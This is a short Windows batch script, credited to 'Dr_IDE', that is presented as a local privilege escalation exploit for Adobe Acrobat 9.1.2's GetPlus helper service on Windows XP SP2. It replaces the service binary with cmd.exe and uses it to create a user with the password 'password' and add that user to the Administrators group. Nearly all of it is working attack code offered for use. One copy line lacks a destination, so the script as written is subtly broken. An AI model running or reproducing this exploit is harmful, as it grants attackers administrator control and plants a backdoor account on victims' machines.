echo *************************************************************
echo *
echo * Adobe Acrobat v9.1.2 Local Privilege Escalation Exploit
echo * Coded By: Dr_IDE
echo * Discovered By: Nine:Situations:Group
echo * Tested On: Windows XP SP2
echo *
echo *************************************************************
echo This will add user Dr_IDE:password to the Admin Group
cd C:\Program Files\NOS\bin
copy /Y GetPlus_HelperSvc.exe GetPlus_HelperSvc.old
copy /Y %systemroot%\system32\cmd.exe
GetPlus_HelperSvc.exe /C net user Dr_IDE password /ADD
GetPlus_HelperSvc.exe /C net localgroup administrators Dr_IDE /ADD
GetPlus_HelperSvc.exe /C net user Dr_IDE
exit